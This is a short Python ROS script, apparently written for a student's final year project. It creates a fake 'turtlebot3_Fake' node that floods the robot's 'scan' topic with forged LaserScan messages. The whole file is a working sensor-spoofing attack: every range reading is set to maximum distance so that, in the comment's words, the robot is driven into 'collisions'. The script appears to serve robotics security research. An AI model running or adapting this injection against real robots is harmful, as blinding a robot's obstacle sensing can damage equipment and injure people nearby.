#!/usr/bin/env python3

# This script creates a ROS node "Turtlebot3_Fake"
# This node just spams the 'scan' topic with bogus LaserScan messages
# Made for my Final Year Project to simulate a data injection attack

import rospy
from sensor_msgs.msg import LaserScan
from std_msgs.msg import Header
from time import time_ns

def talker():
    frequency = 10 # How many times a second the node should publish
    obstacleDistance = 3.5 # How far away the "obstacles" are
    
    pub = rospy.Publisher('scan', LaserScan, queue_size = 10)
    rospy.init_node('turtlebot3_Fake', anonymous=False)
    
    spam = LaserScan()

    # Specify starting value for message ID's - this increases sequentially for every message we publish
    msg_id = 0

    # Construct our LaserScan message
    # Values from a typical Turtelbot3 LaserScan msessages, they are unchanged
    spam.header.frame_id = "base_scan"
    spam.angle_min = 0.0
    spam.angle_max = 6.28318977355957
    spam.angle_increment = 0.017501922324299812
    spam.time_increment = 0.0
    spam.range_min = 0.11999999731779099
    spam.range_max = 3.5
    spam.intensities = [0] * 360

    # These message components are changed for the sake of the attack
    # Time between scans, the inverse of our publishing frequency
    spam.scan_time = 1/frequency  
    # Data for how far away obstacles are, give the max to cause collisions
    spam.ranges = [obstacleDistance] * 360  
        

    rateLimiter = rospy.Rate(frequency)  # 10hz
    while not rospy.is_shutdown():
        msg_id += 1

        # Re-create header for each spam message
        # Sequentially increasing ID for messages
        spam.header.seq = msg_id  
        # Number of seconds since epoch
        spam.header.stamp.secs = time_ns() // 1000000000  
        # Number of nanoseconds since the last second passed
        spam.header.stamp.nsecs = time_ns() % 1000000000  

        # Publish bogus message to 'scan'
        pub.publish(spam)

        # Debug - just so I can see it's still running every 15 minutes
        if (msg_id % (frequency*900)) == 0:
            rospy.loginfo(f"{msg_id} messages published")

        # This limits the while loop to only running at the frequency given
        rateLimiter.sleep()

if __name__ == '__main__':
    try:
        talker()
    except rospy.ROSInterruptException:
        pass
